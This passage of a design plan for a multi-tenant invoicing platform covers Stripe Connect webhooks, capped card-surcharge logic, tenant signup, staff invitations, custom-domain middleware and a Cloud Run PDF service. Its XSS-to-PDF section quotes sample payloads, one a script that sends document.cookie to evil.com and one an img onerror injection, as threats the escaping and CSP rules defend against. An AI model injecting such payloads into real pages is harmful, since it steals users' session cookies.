- `charge.refunded` — `refunded` (full) or `partially-refunded`, with `refundedAt` and `refundedAmountCents`; the original paid amounts are kept for accounting.
- `charge.dispute.created` — `disputed: true`, `disputedAt`, `disputeReason`; status unchanged (disputes can be won); `dispute-created` incident, so owners are emailed the evidence deadline.
- `charge.dispute.closed` — `won`: clear `disputed`, `disputeOutcome: 'won'`. Otherwise `status: 'refunded'`, `disputeOutcome: 'lost'`, and a `dispute-lost` incident.
- `account.updated` — mirror capability state into `meta.stripeStatus`, only for the tenant's current `stripeAccountId`.
- `account.application.deauthorized` — `data.object` is the Application, the account is `event.account`. Clear `stripeAccountId` and `stripeStatus` when it matches and delete the reverse lookup. A real case with full-dashboard accounts: the contractor can disconnect TechFlow from their own Stripe Dashboard.

Incidents are written to `tenants/{t}/invoices/{i}/paymentIncidents/{kind}_{stripeObjectId}`; the `onPaymentIncidentCreated` Cloud Function emails active owners (D5).

**The `stripePayments` entitlement** is controlled by the platform admin and never flipped by a webhook: `account.updated` says whether a tenant *can* charge; the entitlement says whether the platform *allows* card payments for them.

### Development tasks

- Complete the Connect platform profile in the Stripe Dashboard, in both test and live mode.
- Register both webhook endpoints per environment (Deploy Runbook).
- `/billing` onboarding UI — built. Public pay page — not built.

### Credit card surcharge — line-item application

> **D3 (2026-09-13): shipped disabled.** Everything in this section is built but only takes effect for tenants whose entitlements set `features.cardSurcharge: true` (default `false`). `updatePaymentSettings` refuses to switch surcharging on without the flag; `/settings/payments` hides the controls; `buildTenantSnapshot` freezes `chargeCustomerCardFees` as *flag AND tenant setting*; checkout and the pay page read the surcharge from the invoice's frozen snapshot through `effectiveCardSurcharge()` — never from current meta, so the fee charged is the fee disclosed — with the flag as a kill switch. **Do not enable it for any tenant** until credit-only card-funding detection is integrated (Stripe automatic surcharge or a compliance partner): Visa and Mastercard forbid surcharging debit and prepaid cards, and Checkout's `card` type includes them. The code sample below shows the April design; as built, the percent and flag come from the snapshot, not `tenantMeta`.

When a tenant has `chargeCustomerCardFees === true`, the credit card processing fee is added to the Stripe Checkout session as a **separate line item**, not rolled into the invoice total. This preserves the invoice's real amount for accounting and makes the fee visible to the customer (a Visa/Mastercard disclosure requirement).

**Surcharge calculation (server-side, cannot be set by client):**

```typescript
// functions/src/payments/surcharge.ts
const MAX_SURCHARGE_PERCENT = 2.4; // Visa/Mastercard Canadian ceiling — hard cap.

export function computeSurcharge(invoiceTotalCents: number, tenantMeta: TenantMeta): number {
  if (!tenantMeta.chargeCustomerCardFees) return 0;
  const percent = Math.min(tenantMeta.cardFeePercent ?? 0, MAX_SURCHARGE_PERCENT);
  return Math.round(invoiceTotalCents * (percent / 100));
}
```

**Applied in `createPayTokenCheckoutSession`** (the single canonical payment entry point — see C1 decision in the callable inventory):

```typescript
const surchargeCents = computeSurcharge(invoice.totals.totalCents, tenantMeta);
const lineItems = [
  {
    price_data: {
      currency: tenantMeta.currency.toLowerCase(),
      product_data: { name: `Invoice ${invoice.invoiceNumber}` },
      unit_amount: invoice.totals.totalCents,
    },
    quantity: 1,
  },
];
if (surchargeCents > 0) {
  lineItems.push({
    price_data: {
      currency: tenantMeta.currency.toLowerCase(),
      product_data: {
        name: `Credit card processing fee (${tenantMeta.cardFeePercent}%)`,
      },
      unit_amount: surchargeCents,
    },
    quantity: 1,
  });
}

const session = await stripe.checkout.sessions.create({
  mode: 'payment',
  line_items: lineItems,
  // Credit card only — this pay flow is card-only by design. Other methods
  // (bank debit, etc.) would need separate UX and tax/surcharge handling.
  // Debit Visa/Mastercard technically cannot be surcharged per Canadian rules,
  // but Stripe Checkout does not distinguish debit vs credit at the
  // payment_method_types level (both are 'card'). This is the documented MVP
  // limitation in the surcharge section below.
  payment_method_types: ['card'],
  payment_method_options: {
    card: {
      // 3DS only when surcharging — reduces chargeback risk on the higher-value
      // transaction. Non-surcharge payments use Stripe's default 3DS logic.
      request_three_d_secure: surchargeCents > 0 ? 'any' : 'automatic',
    },
  },
  // metadata carries the invoice + surcharge + pay-token version so the
  // webhook can reconcile AND detect regenerate-during-checkout races.
  metadata: {
    invoiceId: invoice.id,
    tenantId: invoice.tenantId,
    surchargeCents: String(surchargeCents),
    basePaidCents: String(invoice.totals.totalCents),
    payTokenVersion: String(invoice.payTokenVersion),  // C2 guard — see webhook reconciliation below
  },
  success_url: `${baseUrl}/pay/${invoice.payToken}/success`,
  cancel_url: `${baseUrl}/pay/${invoice.payToken}/cancelled`,
}, { stripeAccount: tenantMeta.stripeAccountId });
```

**Important constraints:**

- **Cap is hard-enforced server-side at 2.4%**, regardless of what the client or `updatePaymentSettings` tries to set. Any attempt to set `cardFeePercent > 2.4` throws `invalid-argument`.
- **Debit cards cannot legally be surcharged in Canada.** Stripe Checkout does not cleanly distinguish debit vs credit Visa/Mastercard at the payment-method-types level (both show as `card`). Mitigation: accept the risk for MVP and document it — the practical surcharge rate across mixed debit/credit on a contractor's customer base is small. If this becomes a compliance issue, switch to Stripe's Payment Element with explicit credit-only filtering (post-MVP).
- **Quebec exclusion is NOT auto-enforced in MVP.** Detecting a customer's province requires collecting billing address before checkout, which adds friction. Instead, the one-time acknowledgment modal (Phase 5) makes the tenant contractually responsible: "You confirm that you will not surcharge Quebec customers." Tenants with significant Quebec customer bases should leave surcharging off. Post-MVP: optional billing-address prompt pre-checkout that geo-filters.
- **Webhook reconciliation:** `checkout.session.completed` stores the base + surcharge split on the invoice doc (`paidAmountCents`, `surchargeAmountCents`, `paymentMethod: 'card'`). The invoice `totals` block is untouched — surcharge is separate from the invoice amount. This makes accounting exports clean (the invoice was $500, the surcharge was $12, total charged was $512, tenant's Stripe balance shows $512 minus Stripe fees).

- **C2 — pay-token version guard on webhook (prevents regenerate-during-checkout race).** Before marking the invoice paid, the webhook handler re-reads `invoice.payTokenVersion` and compares it against `session.metadata.payTokenVersion`. If they diverge, the tenant regenerated the link after the customer started checkout (e.g., tenant realized the wrong customer got the email and tried to kill the link). Handler then:
  1. Does NOT set `status: 'paid'`.
  2. Issues an immediate full refund via `stripe.refunds.create({ charge: session.payment_intent, ...}, { stripeAccount: tenantAccountId })`.
  3. Writes an audit doc to `tenants/{tenantId}/invoices/{invoiceId}/paymentIncidents` with `{ reason: 'version-mismatch', sessionId, metadataVersion, currentVersion, refundId, createdAt }`.
  4. Sends a notification email to the tenant owner: "A payment was received after you regenerated the pay link for invoice #X and has been automatically refunded. Contact the customer if this was unexpected."

  Why refund instead of accept: the tenant's intent when regenerating was to kill the old link. Accepting a payment made on a "killed" link silently violates that intent. Automatic refund + audit trail makes the behavior honest and debuggable.

### Token-authenticated checkout (no Firebase auth)

`createPayTokenCheckoutSession` accepts a pay token instead of a Firebase auth context. Server-side:

1. Verify the JWT signature with `PAY_TOKEN_SECRET`.
2. Read the invoice doc; verify `payTokenVersion` matches and `status !== 'paid'`.
3. Check a rate-limit counter at `tenants/{tenantId}/invoices/{invoiceId}/payAttempts` — if more than 10 checkout sessions have been created in the last 24h, reject with `resource-exhausted`. Prevents abuse of the public endpoint. **R2 — auto-cleanup:** each `payAttempts` doc carries an `expireAt: Timestamp` field set to `createdAt + 48h`. A Firestore TTL policy on the `payAttempts` subcollection with `expireAt` as the TTL field deletes expired attempts automatically (configured once per project in Firebase Console → Firestore → TTL policies). No scheduled cleanup function needed. Prevents storage bloat at scale (without this, every invoice accumulates 10 attempt docs forever).
4. Read tenant meta for `stripeAccountId`, `chargeCustomerCardFees`, `cardFeePercent`, `currency`.
5. Build the Checkout session with the surcharge logic above.
6. Return `{ url: session.url }` — client redirects.

The function is rate-limited (Cloud Functions v2 `maxInstances: 10`, `cpu: 1`) and uses `PAY_TOKEN_SECRET` from `defineSecret()` — never an env var. Logged attempts include token hash (not the token itself), invoice ID, and outcome. Sentry tags the invoice's `tenantId`.

**Estimated effort:** 4–6 days. Budget an extra day for Stripe docs reading and end-to-end testing.

---

## Phase 5 — Tenant Onboarding Flow

### Signup flow (transactional)

**⚠️ `onSignup` MUST be a callable Cloud Function (`onCall`), NOT an Auth `onCreate` trigger.** A trigger fires asynchronously, so the client can't know when claims exist; `getIdToken(true)` would race it and signup would fail intermittently and be impossible to debug. With a callable the client awaits completion, then refreshes the token.

**Client side** (`src/app/(auth)/signup/page.tsx`):

```typescript
const { user } = await createUserWithEmailAndPassword(auth, email, password);
await httpsCallable(functions, "onSignup")({ businessName });  // AWAIT — claims now set
sendEmailVerification(user).catch(() => {});                   // fire-and-forget
await user.getIdToken(true);                                    // pull the new claims
router.replace("/dashboard");
```

**tenantId generation (C4):** slug of the business name (lowercase, non-alphanumeric runs → `-`, trimmed, max 40 characters, fallback `tenant`) with `-1`, `-2`, … on collision, chosen inside a transaction that checks `tenants/{candidate}/meta/settings` (`functions/src/shared/tenantId.ts`). Readable ids show up in Firestore paths, Stripe metadata, Sentry tags, and support conversations.

**Server side** (`functions/src/tenants/onSignup.ts`):

1. Requires auth with an email; rejects a user who already has a membership (not yet transactional — A-12).
2. Validates `businessName` (2–100 characters) and generates the tenantId.
3. One batch writes:
   - `tenants/{id}/meta/settings` ← `defaultTenantMeta(businessName, ownerEmail)` (`functions/src/shared/meta.ts`)
   - `tenants/{id}/entitlements/current` ← `{ plan: "starter", maxInvoicesPerMonth: 10, features: {} }`
   - `tenants/{id}/counters/invoice` and `counters/quote` ← `{ value: 0 }` (C5 — the first numbering transaction never reads a missing doc)
   - `users/{uid}` ← `{ uid, email, displayName: null, defaultTenantId }`
   - `userTenantMemberships/{uid}_{id}` ← `{ uid, tenantId, role: "owner", invitedBy: null, deletedAt: null }`
4. Sets custom claims `{ tenantId, role: "owner" }` **after** the batch commits, so a partial failure never leaves claims pointing at a tenant that doesn't exist.

**`defaultTenantMeta` initialises every field.** If any snapshot field were `undefined`, the first invoice would freeze it and PDFs or tax math would break silently — the most expensive-to-debug bug class in the plan. Defaults: `contactEmail` = owner email, `primaryColor #667eea`, `secondaryColor #764ba2`, `fontFamily Inter`, `taxRate 0.13`, `taxName HST`, `invoicePrefix INV`, `currency CAD`, `customDomainStatus.stage unverified`, `stripeStatus` all false, `chargeCustomerCardFees false`, `cardFeePercent 2.4`, every nullable field `null`. Do not remove defaults.

### Settings page (`/settings`)
- Edit business name, reply-to email (`contactEmail`, D5), address
- Edit branding: primaryColor, secondaryColor, fontFamily picker, favicon upload
- **Contrast guard on color pickers** — primaryColor and secondaryColor inputs run `meetsWcagAA(hex, '#FFFFFF')` on change; if the ratio is below 4.5:1, show inline error "This color is too light — button text won't be readable. Try a darker shade." Save button stays disabled until valid. `updateTenantBranding` callable re-validates server-side.
- Logo upload → Firebase Storage at `tenants/{tenantId}/logo.{ext}` (png, jpg, webp, svg; Storage rules mirror Firestore tenant scoping).
  **⚠️ After upload, call `getDownloadURL(ref)` and store the returned public https URL in `meta.logoUrl` — NOT the Storage path.** The token-bearing download URL is what's publicly fetchable; the raw Storage path (e.g. `tenants/acme/logo.png`) requires authenticated Storage access, which customers and the PDF renderer don't have. Same rule for `favicon.ico` → `meta.faviconUrl`.
- Favicon upload → Firebase Storage at `tenants/{tenantId}/favicon.{ext}` (ico, png, svg; see getDownloadURL note above)
- Show current plan (read-only), button to contact for upgrade (manual for MVP)

### Payment settings (`/settings/payments`)

> **D3:** controls 2–4 and the acknowledgment modal render only when the tenant's `cardSurcharge` feature is enabled (default off). The e-Transfer email field is always shown.

Dedicated sub-page for everything payment-related. Separate from the main settings page because it has compliance implications (surcharging) and enough controls to warrant its own surface.

**Fields and controls:**

1. **Interac e-Transfer email** — single text input, validated as email format. Written to `meta.etransferEmail`. This is what customers see as the e-transfer destination on the pay page and in the PDF. If blank, e-transfer is hidden from customer-facing surfaces. Includes hint: "Most contractors use the same email where they want the money deposited. This is shown to customers on every invoice."

2. **Credit card surcharge toggle** — boolean switch bound to `meta.chargeCustomerCardFees`. Off by default. Toggling ON triggers the acknowledgment modal (below) on first enable only; subsequent toggles don't re-show the modal because `surchargeAcknowledgedAt` is already set.

3. **Surcharge percentage** — number input, disabled if toggle is off. Default 2.4, max 2.4 (enforced client-side with HTML `max` attribute AND server-side in `updatePaymentSettings` callable — belt and suspenders). Hint below: "Visa and Mastercard Canada cap surcharges at 2.4%. You cannot charge more even if you want to."

4. **Preview row (R5 — honest 3-row net breakdown).** A live-updating calculation table showing what ACTUALLY happens on a typical $500 invoice. Surcharging does NOT eliminate processing fees — it reduces them. Tenants need to see the real math or they will feel deceived at their first Stripe payout.

   ```
   On a $500 invoice paid by credit card:
   ─────────────────────────────────────────────────────────
   Customer pays                          $512.00
   Stripe fee (2.9% + $0.30)             −$15.15
   ─────────────────────────────────────────────────────────
   You receive (net)                      $496.85
   Without surcharge you'd receive:       $484.55
   Surcharging saves you:                 +$12.30 per invoice
   ```

   Reasoning surfaced to the tenant in small text below: "The 2.4% cap is set by Visa and Mastercard — you can't charge more. Stripe's actual cost is 2.9% + 30¢, so you'll still absorb roughly 0.5% + 30¢ per transaction. Surcharging passes most of the cost to customers, but not all of it."

   The e-transfer row stays simple: "E-transfer — customer pays $500, you receive $500, no fees." This is the honest comparison that makes e-transfer-first layout make sense.

**Surcharge acknowledgment modal (one-time, on first toggle ON):**

Rendered with shadcn `<AlertDialog>`. Content:

> **Before you enable credit card surcharging**
>
> Canadian card-network rules require that you:
>
> 1. **Notify Visa and Mastercard 30 days before surcharging begins.** Forms are on their respective websites (linked below). This is required — not optional. Our platform cannot do this on your behalf.
>    - [Visa Canada merchant surcharge notification](https://www.visa.ca/) (link to be verified)
>    - [Mastercard Canada merchant surcharge notification](https://www.mastercard.ca/) (link to be verified)
>
> 2. **Do not surcharge Quebec customers.** Quebec's Consumer Protection Act prohibits credit card surcharges. If you serve Quebec residents, you must leave this setting off, or manually disable it for those specific invoices.
>
> 3. **Do not surcharge debit card payments.** Our platform cannot fully distinguish debit from credit Visa/Mastercard at checkout. If this becomes a compliance concern, contact support.
>
> 4. **Surcharges are capped at 2.4%** — the Canadian network ceiling. We enforce this cap automatically.
>
> 5. **The surcharge must be disclosed before the customer pays.** Our platform handles this automatically — the pay page shows "+ X% processing fee" next to the credit card option, and the PDF invoice shows the surcharge as a separate line when paid by card.
>
> ☐ **I confirm I have notified Visa and Mastercard and understand the Quebec and debit-card restrictions.**
>
> [ Cancel ] [ Enable surcharging ]

Checkbox must be checked before "Enable surcharging" is clickable. On confirm, `updatePaymentSettings` is called with `chargeCustomerCardFees: true` AND `surchargeAcknowledgedAt: serverTimestamp()`. The server-side callable refuses to set `chargeCustomerCardFees: true` if `surchargeAcknowledgedAt` would still be null after the update (defensive — can't bypass the modal by hitting the API directly).

**Why this matters legally:**

The platform (TechFlow) is not a payment processor — Stripe is. But if a tenant gets audited by Visa/Mastercard for undisclosed surcharging, the platform's defense is "we disclosed the rules, required acknowledgment, and enforced the 2.4% cap." The `surchargeAcknowledgedAt` timestamp is the audit trail. Log it immutably (serverTimestamp, never client-writable).

**Why link verification is deferred:**

The Visa/Mastercard merchant-surcharge notification URLs change periodically. Phase 5 implementer should verify the current URLs at build time and update the modal copy. If the links 404 at any point, the modal should fall back to "Search for 'merchant surcharge notification' on visa.ca and mastercard.ca" — the *requirement* to notify doesn't change even if the URLs do.

### Staff invitation flow
The signup flow only creates the *first* user (the owner) for a tenant. Any subsequent staff (office manager, second technician, bookkeeper) must be invited through a separate flow that never exposes the tenant to the public signup page.

**Why a dedicated flow (not "second user signs up and picks a tenant"):**
- A public "join existing tenant" signup would let anyone claim to be part of Smith Plumbing. Token-gated invitations are the only safe pattern.
- Firebase custom claims can't be set by a client — only Admin SDK. So acceptance has to go through a callable Cloud Function that verifies the token, then sets the correct `tenantId`/`role` claims on the accepting user.

**Data model:** `tenants/{tenantId}/invitations/{inviteId}` — schema defined in Phase 1 Firestore structure. Token is hashed (SHA-256) before storage; the raw token is only in the invite email.

**Flow:**
1. Owner/admin on `/settings/team` enters `email` + `role` (`admin` | `staff`), clicks Invite.
2. Client calls `createInvitation` callable with `{ email, role }`. Function requires caller to have `role in ['owner', 'admin']` on the target tenant.
3. Function generates a random token (32 bytes, base64url), hashes it, writes `invitations/{inviteId}` with `{ tenantId, email, role, tokenHash, invitedBy: callerUid, createdAt, expiresAt: now + 7 days, acceptedAt: null, revokedAt: null }`, refusing a duplicate pending invite for the same email.
4. Function sends the invite email through SES (once per invitation, D5) containing `{APP_URL}/accept-invite?tenantId={tenantId}&invitationId={inviteId}&token={rawToken}`.
5. Invitee clicks link. If not signed in, they either sign in (existing Firebase account matching the invite email) or sign up with a password. **The email on their Firebase account MUST match the invite's `email` field** — the accept function verifies this to prevent invite theft.
6. Client calls `onAcceptInvite({ tenantId, inviteId, token })`. Function:
   - Loads the invite doc, checks `acceptedAt == null` and `expiresAt > now`.
   - Hashes the supplied token and compares to stored hash.
   - Verifies `request.auth.token.email == invite.email` and `email_verified == true`.
   - Calls `admin.auth().setCustomUserClaims(uid, { tenantId, role })`.
   - Creates (or updates) `users/{uid}` with `{ uid, email, displayName: null, defaultTenantId: tenantId }`.
   - Creates `userTenantMemberships/${uid}_${tenantId}` with `{ uid, tenantId, role, invitedBy: invite.invitedBy, createdAt, deletedAt: null }`. Post-MVP multi-tenant UI will let users switch `defaultTenantId` between memberships.
   - Marks invite `acceptedAt = serverTimestamp()`.
7. Client calls `user.getIdToken(true)` to refresh claims (same propagation-delay fix as signup), then redirects to `/dashboard`.

**Revocation:** before acceptance, owner/admin calls `revokeInvitation`, which stamps `revokedAt`/`revokedBy` (the doc is kept for audit). After acceptance, they use `setUserRole` or disable the user in Firebase Auth.

**Edge cases:**
- Invitee already has a Firebase account belonging to a different tenant → MVP still rejects at `onAcceptInvite` (one *active* tenant per user for MVP; the JWT claim can only point at one). The schema supports multi-tenant memberships from day one, so post-MVP this rejection is lifted and becomes a "switch active tenant" UI — no migration needed.
- Invite email bounces → owner sees "not yet accepted" in `/settings/team`, can resend or revoke.
- Token leaked from email → 7-day expiry + one-time use (`acceptedAt` check) limits blast radius.

### Custom domain support
Two domain tiers per tenant:
1. **Generic (immediate):** `portal.techflowsolutions.ca` — works out of the box, no DNS needed. Tenant resolved via auth claims after login.
2. **Custom (configured):** e.g. `invoices.smithplumbing.ca` — client points DNS (CNAME to `cname.vercel-dns.com`), Vercel handles SSL automatically.

**Implementation:**

- **`customDomain` field in tenant meta.** Set by Reggie (platform admin) during onboarding or by tenant in `/settings` (if on a plan that includes custom domains — feature-gated via `entitlements`).
- **`customDomains/{domain}` Firestore collection.** Reverse lookup: `domain → tenantId`. Written by the `setupCustomDomain` callable (owner/admin, `customDomain` feature) and removed by `removeCustomDomain`. The middleware reads it only on an Edge Config miss.
- **Vercel domain provisioning.** Cloud Function calls the [Vercel Domains API](https://vercel.com/docs/rest-api/endpoints/domains) to add/remove the domain from the Vercel project when `customDomain` is set/changed.
- **Next.js middleware** (`src/middleware.ts`, Node.js runtime via `config.runtime`; becomes `src/proxy.ts` on Next 16):
  1. On every request, read `Host` header and **delete any incoming `x-tenant-id`** — portal layouts trust that header, so a client-supplied value must never reach them.
  2. If host is not `portal.techflowsolutions.ca` (the generic domain; also `localhost`, `127.0.0.1`, `*.vercel.app`), look up `tenantId` (Edge Config, then `customDomains/{host}`).
  3. If found, inject `x-tenant-id` into the forwarded request headers so the login page and portal can load that tenant's branding.
  4. If not found, 404.

  **R3 — `config.matcher` MUST exclude static assets and API routes:**
  ```typescript
  export const config = {
    matcher: [
      // Run middleware on all paths EXCEPT:
      // - _next/static (Next.js static files)
      // - _next/image (image optimization)
      // - favicon.ico, robots.txt, sitemap.xml
      // - api/* (API routes authenticate via Authorization header, not host-based tenant resolution)
      // - any file extension (fonts, images, CSS, etc.)
      '/((?!_next/static|_next/image|favicon.ico|robots.txt|sitemap.xml|api/|.*\\..*).*)',
    ],
  };
  ```
  Without this matcher, middleware fires on every static asset request (every image, CSS file, font, favicon) — at 50 tenants on custom domains, a single page view triggers 20+ Firestore reads just for middleware resolution. With the matcher, middleware only runs on actual HTML page requests (~1 read per page view). Rough math: 50 tenants × 1000 daily visitors × 20 assets = 1M unnecessary Firestore reads/day without this. Cost-wise ~$6/day, latency-wise 50–200ms added to every asset load. The matcher is the single biggest scale optimization in the middleware spec.

  **⚠️ Edge runtime vs Node.js runtime — architectural choice required before Phase 5.**
  Next.js middleware runs on the **Edge runtime by default**, which is a lightweight V8 environment with **no Node.js APIs**. The Firebase Admin SDK depends on Node.js (`fs`, `crypto`, `net`) and **will not run in Edge middleware**. If middleware is written assuming `firebase-admin`, the first request after deploy fails with a cryptic `Module not found` or `Cannot read properties of undefined`.

  Three valid options — pick one before writing the middleware:
  1. **Force Node.js runtime:** add `export const config = { runtime: 'nodejs' };` to `middleware.ts`. Slower cold start, higher cost per request, but Firebase Admin SDK works. Acceptable at 50-tenant scale.
  2. **Use Firestore REST API directly from Edge:** `fetch('https://firestore.googleapis.com/v1/projects/.../documents/customDomains/...')` with a service-account OAuth token. Keeps Edge performance but you write the REST calls and token minting by hand.
  3. **Cache `customDomains` in Vercel Edge Config or KV:** write to Edge Config from the Cloud Function that manages custom domains, read from Edge Config in middleware. Fastest at request time, eventual-consistency lag when a domain is added/removed.

  **Recommendation:** Option 1 (Node.js runtime) for MVP — simplest, one line of config, one lookup path. Revisit if middleware latency becomes noticeable.

  **⚠️ Cache the domain lookup — Firestore read per request is not acceptable at scale.**
  Even with Node.js runtime and the `config.matcher` above, the naive implementation runs one Firestore read per HTML page view per custom domain. Cold-path Firestore reads are 100–300ms — that's latency a user feels before the login page starts rendering. At 50 tenants × 1000 page views/day, it's also ~50k Firestore reads/day purely for domain resolution, when the data changes maybe once a month.

  **Required — Vercel Edge Config as the authoritative lookup, Firestore as the write-side source:**
  1. The `setupCustomDomain` Cloud Function (the same one that manages Vercel Domains API + Firebase authorized domains) also writes `{ [domain]: tenantId }` to Vercel Edge Config via the Edge Config API. Edge Config keys must match `^[\w-]+$`, so the host has to be encoded — the current `domain:{host}` key is invalid (A-07).
  2. Middleware reads from Edge Config (`get(host)` from `@vercel/edge-config`) — sub-50ms globally replicated, no Firestore read on the hot path.
  3. Firestore `customDomains/{domain}` remains the durable source of truth (for audit + recovery if Edge Config is ever inconsistent), and is what the Cloud Function updates first.
  4. Eventual-consistency lag (~seconds) between "tenant saves custom domain" and "domain resolves in middleware" is acceptable — adding a custom domain is already a multi-minute DNS propagation operation; a few seconds of cache lag is invisible.
  5. Miss path: if Edge Config returns nothing, fall back to a single Firestore read and **re-populate Edge Config on the spot** so only the first request pays the cost.

  This is Phase 5 scope, not a later optimization — building the middleware without it means ripping it out and redoing it under load.

- **Branded login page.** The `/portal/login` route reads the resolved `tenantId` (from middleware), fetches `tenants/{tenantId}/meta/settings` via `getTenantBranding` (subset: name, logoUrl, primaryColor, faviconUrl), and renders the login page with the tenant's branding. The customer sees "Smith Plumbing" on the login screen, not "TechFlow."

  **⚠️ This fetch MUST be server-side via Firebase Admin SDK — never client-side.**
  A visitor to the login page is unauthenticated. The Firestore rule `allow read: if request.auth.token.tenantId == tenantId` blocks unauthenticated reads of `meta`. A client-side `getDoc()` call returns permission-denied, the login page renders with no branding (or crashes), and the whole bundled-offering value prop breaks on the first customer load.

  Correct implementation: make `/portal/login` a **React Server Component** (or use `getServerSideProps` if using the pages router — but we're on App Router). In the server component, read the resolved `tenantId` from the middleware-injected header, then call `adminDb.doc(\`tenants/${tenantId}/meta\`).get()` using the Admin SDK (which bypasses rules because it runs with service-account credentials). Pass the branding values as props to the client-side login form.

  Do NOT add a "public read" branch to the Firestore rules for `meta` to work around this. That leaks every tenant's branding + address + business number to anyone who can guess a tenantId. Keep rules strict; use Admin SDK on the server for legitimate public-facing reads.
- **Firebase Auth authorized domains (automated).** Each custom domain must be added to Firebase Auth's authorized domains list for magic-link redirects to work. **This MUST be automated** — at 50 clients, manual addition is not viable. The same Cloud Function that calls the Vercel Domains API must also call the Firebase Auth Admin SDK (`admin.auth().projectConfigManager().updateProjectConfig()` or the Identity Toolkit REST API) to add the domain to the authorized list. When a custom domain is removed, the function must also remove it from the authorized domains list. This is a single Cloud Function that does four things atomically: (1) add/remove Vercel domain, (2) add/remove Firebase Auth authorized domain, (3) write/delete `customDomains/{domain}` doc, (4) write/delete the `{ [domain]: tenantId }` entry in Vercel Edge Config for middleware caching.

- **Domain verification state surfaced in `/settings/domain`.** Adding a custom domain isn't instant — DNS propagation (5 min to 48 hrs) and SSL issuance (Vercel's Let's Encrypt flow, usually <10 min but sometimes longer) each have their own state. If we don't show this, contractors enter a domain, see "saved," and then email support when it doesn't work an hour later.
  - Store `customDomainStatus` in tenant meta: `{ stage: 'unverified' | 'dns_pending' | 'ssl_pending' | 'verified' | 'error', message, checkedAt }`.
  - The `setupCustomDomain` Cloud Function polls the Vercel Domains API (`GET /v10/domains/{domain}/config` + `GET /v9/projects/{id}/domains/{domain}`) for `verified` + `verification` records, and updates `customDomainStatus` as the state changes. A scheduled function re-checks every 5 minutes while `stage !== 'verified'`.
  - `/settings/domain` UI shows the current stage with a banner: DNS records the tenant needs to add (pulled from Vercel's `verification` field), current status, last-checked timestamp, and a "re-check now" button.
  - Until `stage === 'verified'`, the portal at the custom domain is not reachable, but the generic `portal.techflowsolutions.ca` still works. Outgoing invoice emails should keep linking to the generic domain until verification completes (don't send customers to a broken URL).

**Estimated effort:** 2–3 days on top of the base Phase 5 onboarding flow.

### Platform admin tooling (MVP)
- **No admin UI initially.** Reggie flips feature flags and changes plans by editing Firestore directly via the Firebase console.
- Proper admin UI is a later feature, not blocking launch.

**Estimated effort:** 2–3 days

---

## Phase 6 — PDF Generation

PDF rendering runs on the dedicated **Cloud Run** `pdf-service` microservice — see "PDF Generation Strategy" section above for rationale and service shape. Phase 6 covers the Next.js-side proxy routes and the Cloud Run service port from the old repo.

### Architecture (recap)

```
Customer / Contractor
       ↓
Next.js  /api/pdf/invoice  (Vercel)
   - verifies Firebase ID token (dual auth)
   - feature gate check
   - loads invoice doc + tenantSnapshot
   - POSTs { snapshot, data } + X-Api-Key
       ↓
Cloud Run  pdf-service
   - validates X-Api-Key
   - renders HTML via Puppeteer + full Chrome
   - returns PDF bytes
       ↓
Streamed back through Next.js to the caller
```

### Next.js proxy route (`/api/pdf/invoice/route.ts`)

- Accepts invoice ID + tenant ID (tenant ID because invoices are nested under `tenants/{tenantId}/invoices/{id}` and the ID alone is ambiguous) + Firebase ID token in `Authorization: Bearer <token>` header
- Verifies token server-side via `firebase-admin`
- **Dual auth pattern (two branches):**
  - **Tenant user path:** Token has `tenantId` claim → verify `tenantId` matches the invoice's parent tenant path. Contractor previewing/downloading their own invoice.
  - **Customer path:** Token has NO `tenantId` claim but has `email_verified: true` → verify token email matches the invoice's `customer.email`. End-customer downloading from the portal.
  - If neither branch matches → 403.
- Checks `invoices` feature is enabled for the invoice's tenant (read from `entitlements`)
- Loads the invoice doc, extracts `tenantSnapshot`
- POSTs `{ snapshot, data }` to `${PDF_SERVICE_URL}/render/invoice` with `X-Api-Key: ${PDF_SERVICE_API_KEY}`
- Streams the PDF response back to the caller

**Key detail:** the proxy route is the security boundary. Cloud Run trusts what the proxy sent. Do NOT forward the raw Firebase ID token to Cloud Run — the proxy has already validated it.

### Cloud Run `pdf-service` (ported from old repo)

- **Reads branding from the `tenantSnapshot` passed in by the proxy — NOT from Firestore.** This is critical: the Phase 0 decision locks invoices as frozen legal documents. A contractor who rebranded after sending this invoice must not have the PDF retroactively change. The snapshot contains: name, logo (base64), address, primaryColor, secondaryColor, fontFamily, faviconUrl, taxRate, taxName, businessNumber, emailFooter, currency. Cloud Run also never reads Firestore — it's a pure render service.
- Renders an HTML template with Tailwind-compiled CSS inline, using snapshot values
- Returns PDF bytes

### ⚠️ XSS-to-PDF — every user-controlled string must be HTML-escaped before rendering

Puppeteer renders a real Chromium instance. If the tenant's `businessName` is `<script>fetch('//evil.com?'+document.cookie)</script>` or a line-item description contains `<img src=x onerror="…">`, that executes inside our headless Chrome process running on Cloud Run. The attacker gets:
- Script execution inside the PDF render environment (can hit internal URLs, exfiltrate anything in memory).
- Persistent payload: the rendered bytes get saved as the invoice PDF and re-served to customers — the exploit now runs in any PDF viewer that executes JavaScript (some do).
- A path to embed arbitrary hyperlinks in the PDF that look legitimate ("Click to pay" → phishing site).

**Mandatory rules — no exceptions:**

1. **Every interpolation into HTML must go through an escape function.** Use a template engine that auto-escapes by default — recommended: **Handlebars** (`{{ name }}` escapes, `{{{ name }}}` does not and is banned in the codebase). Or use React's `renderToStaticMarkup` (auto-escapes). Do NOT use string concatenation or template literals with raw values for any user-controlled field.

2. **Apply to every `tenantSnapshot` field AND every invoice/customer field.** Specifically: `tenantSnapshot.name`, `tenantSnapshot.address`, `tenantSnapshot.businessNumber`, `tenantSnapshot.emailFooter`, `customer.name`, `customer.address`, `customer.email`, every line-item `description` and `notes`, `invoice.notes`, any custom field. Assume every string in the payload is attacker-controlled — an owner account can compromise themselves only, but a compromised owner can compromise their own customers via the PDF.

3. **Logo URL: validate before embedding.** The `<img src="{{ logoUrl }}">` attribute is still an injection vector even with Handlebars escaping (because `javascript:` URLs aren't HTML-escaped — they're URL-escaped differently). Require `logoUrl` to start with `https://` at validation time, reject anything else. Better: inline the logo as base64 (see "Immutable logo snapshot" below) so this vector disappears entirely.

4. **CSP on the Cloud Run render.** The Express app should serve the render HTML with `Content-Security-Policy: default-src 'none'; img-src data: https:; style-src 'unsafe-inline'; font-src data: https:;`. Blocks any injected `<script>` from executing even if the escape is bypassed. Defense in depth — belt + suspenders.

